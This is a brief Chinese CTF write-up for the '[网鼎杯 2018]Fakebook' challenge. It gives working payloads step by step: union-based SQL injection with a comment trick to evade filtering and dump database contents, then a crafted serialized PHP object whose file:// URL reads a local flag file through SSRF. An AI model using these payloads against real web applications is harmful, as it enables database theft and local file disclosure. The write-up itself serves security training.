# 原创
：  [网鼎杯 2018]Fakebook

# [网鼎杯 2018]Fakebook

#### [网鼎杯 2018]Fakebook

## 考点

> 
Sql注入、信息泄露、ssrf、PHP反序列化


## 思路

> 



## Payload

> 
尝试手工注入，发现是数字型注入


> 
用 `order by number#` 测试为4列，且过滤了union select


> 
执行sql语句 `-1 union/**/select 1,2,3,4#` 发现回显位为第二位


> 
爆数据库：`-1 union/**/select 1,database(),3,4#`


> 
爆表：`-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#`


> 
爆字段：`-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#`


> 
爆data字段数据：`-1 union/**/select 1,data,3,4 from users#`


> 
得到一个序列化后的内容：`O:8:"UserInfo":3:{s:4:"name";s:9:"H3rmesk1t";s:3:"age";i:20;s:4:"blog";s:33:"https://blog.csdn.net/LYJ20010728";}`


> 
访问 robots.txt，提示存在 `/user.php.bak`，下载下来查看


> 
根据data的回显相关内容构造Payload：`-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:9:"H3rmesk1t";s:3:"age";i:20;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#`


> 
查看源码发现`PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s3Yzc5NDg3Mi00ZGU5LTQ4NWMtYjI5MC02MjliNGYwNmFmZjZ9IjsNCmV4aXQoMCk7DQo=`，base64解密得到flag

